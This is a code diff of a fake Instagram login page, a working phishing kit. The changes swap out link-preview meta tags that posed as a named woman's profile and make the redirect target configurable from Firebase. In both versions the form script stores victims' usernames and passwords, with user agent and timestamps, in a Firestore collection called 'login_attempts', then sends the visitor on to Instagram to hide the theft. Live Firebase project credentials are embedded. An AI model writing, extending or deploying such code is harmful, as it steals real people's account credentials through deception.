@@ -4,60 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    
-    <!-- Open Graph / Facebook / WhatsApp / Instagram Meta Tags -->
-    <meta property="og:type" content="website" id="og-type">
-    <meta property="og:url" content="https://instagram-c4qx.onrender.com/" id="og-url">
-    <meta property="og:title" content="Tamanna Sharma - Instagram Profile" id="og-title">
-    <meta property="og:description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!" id="og-description">
-    <meta property="og:image" content="https://instagram-c4qx.onrender.com/images/main.png" id="og-image">
-    <meta property="og:image:width" content="1200" id="og-image-width">
-    <meta property="og:image:height" content="630" id="og-image-height">
-    <meta property="og:image:alt" content="Tamanna Sharma Instagram Profile" id="og-image-alt">
-    <meta property="og:site_name" content="Instagram" id="og-site-name">
-    <meta property="og:locale" content="en_US" id="og-locale">
-    
-    <!-- Instagram Specific Meta Tags -->
-    <meta property="og:image:type" content="image/png" id="og-image-type">
-    <meta property="og:image:secure_url" content="https://instagram-c4qx.onrender.com/images/main.png" id="og-image-secure-url">
-    
-    <!-- Twitter Card Meta Tags -->
-    <meta name="twitter:card" content="summary_large_image" id="twitter-card">
-    <meta name="twitter:url" content="https://instagram-c4qx.onrender.com/" id="twitter-url">
-    <meta name="twitter:title" content="Tamanna Sharma - Instagram Profile" id="twitter-title">
-    <meta name="twitter:description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!" id="twitter-description">
-    <meta name="twitter:image" content="https://instagram-c4qx.onrender.com/images/main.png" id="twitter-image">
-    
-    <!-- Additional Meta Tags for Better SEO -->
-    <meta name="description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!">
-    <meta name="keywords" content="Tamanna Sharma, Instagram, social media, photos, videos">
-    <meta name="author" content="Tamanna Sharma">
-    
-    <!-- Cache Busting for Social Media -->
-    <meta property="og:updated_time" content="2024-01-01T00:00:00Z">
-    <meta name="twitter:updated_time" content="2024-01-01T00:00:00Z">
-    
-    <!-- WhatsApp Specific Meta Tags -->
-    <meta property="og:image:width" content="300">
-    <meta property="og:image:height" content="300">
-    <meta property="og:image:type" content="image/png">
-    <meta property="og:image:alt" content="Tamanna Sharma Instagram Profile">
-    
-    <!-- Instagram Specific Meta Tags -->
-    <meta property="og:image:secure_url" content="https://instagram-c4qx.onrender.com/images/main.png">
-    <meta property="og:site_name" content="Instagram">
-    <meta property="og:locale" content="en_US">
-    
-    <!-- Additional Meta Tags for Better Compatibility -->
-    <meta name="robots" content="index, follow">
-    <meta name="googlebot" content="index, follow">
-    <meta name="theme-color" content="#E4405F">
-    <meta name="msapplication-TileColor" content="#E4405F">
     <link rel="stylesheet" href="./style.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
-    <link rel="icon" href="./images/logo.png" type="image/x-icon">
+    <link rel="icon" href="./images/instagram.png" type="image/x-icon">
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore-compat.js"></script>
@@ -73,7 +24,7 @@
                 <div class="login-box">
                     <img src="images/logo.png" alt="Instagram" class="logo">
                     
-                    <form id="loginForm" class="login-form">
+                    <form id="loginForm" class="login-form" onsubmit="return false;">
                         <div class="form-group">
                             <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                         </div>
@@ -140,117 +91,78 @@
         const firebaseConfig = {
             apiKey: "AIzaSyBFLWTZnHz8EcLjsdHAXDXG5ogU7z0ok0I",
             authDomain: "insta-7f34f.firebaseapp.com",
-            databaseURL: "https://insta-7f34f-default-rtdb.firebaseio.com",
             projectId: "insta-7f34f",
             storageBucket: "insta-7f34f.firebasestorage.app",
             messagingSenderId: "981637167144",
             appId: "1:981637167144:web:841af72e833be6ed081d1d"
         };
-      
+
         // Initialize Firebase
         const app = firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        // Function to update meta tags dynamically
-        function updateMetaTags(metaData) {
-            if (metaData.title) {
-                document.getElementById('og-title').setAttribute('content', metaData.title);
-                document.getElementById('twitter-title').setAttribute('content', metaData.title);
-                document.title = metaData.title;
-            }
-            
-            if (metaData.description) {
-                document.getElementById('og-description').setAttribute('content', metaData.description);
-                document.getElementById('twitter-description').setAttribute('content', metaData.description);
-            }
-            
-            if (metaData.image) {
-                document.getElementById('og-image').setAttribute('content', metaData.image);
-                document.getElementById('og-image-secure-url').setAttribute('content', metaData.image);
-                document.getElementById('twitter-image').setAttribute('content', metaData.image);
-            }
-            
-            if (metaData.url) {
-                document.getElementById('og-url').setAttribute('content', metaData.url);
-                document.getElementById('twitter-url').setAttribute('content', metaData.url);
-            }
-            
-            if (metaData.imageAlt) {
-                document.getElementById('og-image-alt').setAttribute('content', metaData.imageAlt);
-            }
-        }
-
-        // Load meta data from Firebase on page load
-        async function loadMetaData() {
+        // Function to get redirect URL
+        async function getRedirectUrl() {
             try {
-                const metaDoc = await db.collection("meta_settings").doc("current").get();
-                if (metaDoc.exists) {
-                    const metaData = metaDoc.data();
-                    updateMetaTags(metaData);
-                    console.log("Meta tags updated from Firebase:", metaData);
+                console.log("Fetching redirect URL...");
+                const doc = await db.collection("config").doc("redirect").get();
+                
+                if (!doc.exists) {
+                    console.log("No redirect document found, using default");
+                    return "https://www.instagram.com/";
                 }
+                
+                const url = doc.data().url;
+                console.log("Retrieved URL:", url);
+                
+                if (!url) {
+                    console.log("URL is empty, using default");
+                    return "https://www.instagram.com/";
+                }
+                
+                return url;
             } catch (error) {
-                console.error("Error loading meta data:", error);
+                console.error("Error getting redirect URL:", error);
+                return "https://www.instagram.com/";
             }
         }
-
-        // Force meta tag refresh for social media platforms
-        function forceMetaRefresh() {
-            // Update meta tags with current timestamp to force cache refresh
-            const timestamp = new Date().toISOString();
-            document.querySelector('meta[property="og:updated_time"]').setAttribute('content', timestamp);
-            document.querySelector('meta[name="twitter:updated_time"]').setAttribute('content', timestamp);
-            
-            // Ensure all meta tags are properly set
-            const metaTags = {
-                'og:title': 'Tamanna Sharma - Instagram Profile',
-                'og:description': 'Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!',
-                'og:image': 'https://instagram-c4qx.onrender.com/images/main.png',
-                'og:url': 'https://instagram-c4qx.onrender.com/',
-                'twitter:title': 'Tamanna Sharma - Instagram Profile',
-                'twitter:description': 'Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!',
-                'twitter:image': 'https://instagram-c4qx.onrender.com/images/main.png',
-                'twitter:url': 'https://instagram-c4qx.onrender.com/'
-            };
-            
-            Object.entries(metaTags).forEach(([property, value]) => {
-                const meta = document.querySelector(`meta[property="${property}"], meta[name="${property}"]`);
-                if (meta) {
-                    meta.setAttribute('content', value);
-                }
-            });
-        }
-
-        // Load meta data when page loads
-        loadMetaData();
-        
-        // Force refresh after a short delay to ensure proper loading
-        setTimeout(forceMetaRefresh, 1000);
 
         // Handle form submission
-        document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault();
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('loginForm');
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            try {
-                // Store in Firebase
-                await db.collection("login_attempts").add({
-                    username: username,
-                    password: password,
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    userAgent: navigator.userAgent,
-                    timestampClient: new Date().toISOString()
-                });
+            loginForm.addEventListener('submit', async function(event) {
+                event.preventDefault();
+                console.log("Form submission started");
                 
-                // Redirect to Instagram after successful storage
-                window.location.href = "https://www.instagram.com/";
-            } catch (error) {
-                console.error("Error storing data: ", error);
-                // Still redirect even if storage fails
-                window.location.href = "https://www.instagram.com/";
-            }
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                
+                try {
+                    console.log("Storing data...");
+                    await db.collection("login_attempts").add({
+                        username: username,
+                        password: password,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        userAgent: navigator.userAgent,
+                        timestampClient: new Date().toISOString(),
+                        source: window.location.hostname
+                    });
+                    console.log("Data stored successfully");
+                    
+                    // Get redirect URL
+                    const redirectUrl = await getRedirectUrl();
+                    console.log("Final redirect URL:", redirectUrl);
+                    
+                    // Force redirect
+                    window.location.href = redirectUrl;
+                    
+                } catch (error) {
+                    console.error("Error in form submission:", error);
+                    // On error, redirect to default URL
+                    window.location.href = "https://www.instagram.com/";
+                }
+            });
         });
     </script>
 </body>
